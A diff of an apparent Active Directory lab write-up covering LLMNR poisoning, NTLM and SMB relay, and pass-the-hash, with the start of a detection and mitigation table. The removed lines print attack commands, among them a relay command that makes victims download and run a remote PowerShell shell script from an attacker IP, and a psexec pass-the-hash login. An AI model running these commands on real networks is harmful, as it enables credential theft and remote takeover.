@@ -32,33 +32,20 @@ Used the nmap to view all the services running in the host and domain controller
 
 3. LLMNR Poisioning
 Exploited the Link-local Multicast Name Resolution (LLMNR) protocol to capture NTLMv2 hashes from machines attempting to resolve hostnames on the network.
-```
-sudo responder -I eth0 -dPv
-```
+
 When a Windows machine fails DNS resolution, it broadcasts an LLMNR query. Responder intercepts this and responds, causing the victim to authenticate — sending their NTLMv2 hash.
 
 3. NTLM shell invoke using responder
 The attack leverages NTLM relay via WPAD/LLMNR poisoning to capture and forward authentication attempts to a target system lacking SMB signing. The relayed session is then used to execute a remotely hosted PowerShell script, resulting in arbitrary command execution and a reverse shell connection.
-```
-sudo responder -I eth0 -dwv
-```
-```
-impacket-ntlmrelayx -tf iptargets.txt -smb2support -c "powershell IEX(NEW-Object Net.WebClient).downloadString('http://192.168.0.69:80000/Downloads/shells.ps1')"
-```
+
 When a Windows machine fails DNS resolution, it sends out an LLMNR/WPAD broadcast to find the requested host. Responder intercepts this request and replies as the legitimate server, forcing the victim to authenticate to the attacker. The victim then sends an NTLMv2 authentication challenge-response, which can be captured and relayed using ntlmrelayx to another target, where it is accepted as valid and used for remote execution.
 
 4. SMB relay and relay with interactive shell
 Then attack leverages LLMNR/NBT-NS poisioning to intercept authentication attempts broadcast by windows hosts failing dns resolution. Responder captures NTLMv2 challenge-response and forwards it to ntlmrelayx, which relays credentials to a target host lacking SMB signing enforcement. Since the target cannot verify authenticity of the relayed session, it accepts the credentials as legititmate, allowing an interactive shell.
 
-```
-impacket-ntlmrelayx -tf iptargets.txt -smb2support -i
-```
 5. Pass-the-hash
 Once we obtain NTLM hashes we can pass it, as the windows accepts it as valid credentials, without needing the plaian text password.
 
-```
-impacket-psexec administrator@192.168.0.72 -hashes
-```
 # Detection and mititgation
 | Technique | Detetction | Mititgation |
 | --- | --- | --- |
